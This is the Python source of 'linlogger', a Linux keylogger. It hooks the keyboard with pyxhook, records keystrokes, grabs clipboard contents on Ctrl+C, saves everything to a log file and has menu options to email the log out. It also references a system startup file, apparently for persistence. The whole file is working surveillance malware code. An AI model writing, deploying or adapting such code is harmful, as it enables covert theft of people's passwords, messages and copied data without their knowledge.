import functools
import os
import signal
import subprocess
import sys

import clipboard
import pyxhook

from linlogger import mailing
from linlogger.cli import *
from linlogger.files.management import *


LINLOGGER_FILE = os.path.abspath(os.path.basename(__file__))
LOG_FILE = os.path.join(os.path.dirname(LINLOGGER_FILE), 'log.txt')
SYSTEM_STARTUP_FILE = '/etc/init/startup.conf'

char_list = []
hook_manager = None


def has_sudo_privileges():
    return not os.getuid()


def has_clipboard_data(event):
    global char_list

    if event.Key == 'c' or event.Key == 'C':
        try:
            penultimate_char = char_list[-2].strip()
            if penultimate_char == 'CONTROL_L' or penultimate_char == 'CONTROL_R':
                return True
        except IndexError:
            penultimate_char = char_list[0].strip()
            if penultimate_char == 'CONTROL_L' or penultimate_char == 'CONTROL_R':
                return True
    return False


def keyboard_event(event):
    global char_list

    # space
    if event.Ascii == 32:
        char_list.append(' ')
    # enter
    elif event.Ascii == 13:
        char_list.append('\n')
    # normal char
    elif 32 < event.Ascii < 127:
        char_list.append(event.Key)
        if has_clipboard_data(event):
            char_list.append('\n[CLIPBOARD]: ' + clipboard.paste() + '\n')
    # special char
    else:
        char_list.append('\n' + event.Key.upper())

    # avoid opening file so often
    if len(char_list) > 100:
        append_to_file(LOG_FILE, char_list)

        # check if user do not want to copy anything
        if char_list[-1] != 'CONTROL_L' or char_list[-1] != 'CONTROL_R':
            char_list = []


def start_normally():
    global hook_manager

    if not hook_manager:
        hook_manager = pyxhook.HookManager()
        hook_manager.KeyDown = keyboard_event
        hook_manager.HookKeyboard()
        hook_manager.start()
        message_to_screen('Started in normal mode', True)
    else:
        message_to_screen('Script is already running', False)


def stop():
    global hook_manager

    if hook_manager:
        hook_manager.cancel()
        hook_manager = None
        save_data()
        message_to_screen('Keylogging stopped', True)
    else:
        message_to_screen('Script must be running', False)


def catch_signals():
    # Ctrl + C
    signal.signal(signal.SIGINT, linlogger_quit)
    # On terminal close
    signal.signal(signal.SIGHUP, linlogger_quit)
    # Ctrl + Z
    signal.signal(signal.SIGTSTP, linlogger_quit)
    # More gentle signal than SIGKILL
    signal.signal(signal.SIGTERM, linlogger_quit)


def save_data():
    global char_list

    append_to_file(LOG_FILE, char_list)
    char_list = []


def linlogger_quit(signum=None, frame=None):
    global hook_manager

    if hook_manager:
        hook_manager.cancel()
        hook_manager = None
    save_data()
    sys.exit(0)


def main():
    menu()
    options = {
        'start': start_normally,
        'set_email': mailing.set_credentials,
        'check_email': mailing.check_credentials,
        'send_log': functools.partial(mailing.send_file, LOG_FILE),
        'check_log': functools.partial(read_file, LOG_FILE),
        'remove_log': functools.partial(clean_file, LOG_FILE),
        'stop': stop,
        'help': hints,
        'quit': linlogger_quit,
    }

    while True:
        catch_signals()
        user_choice = input('\n> ')
        options.get(user_choice, invalid_command)()


if __name__ == '__main__':
    main()
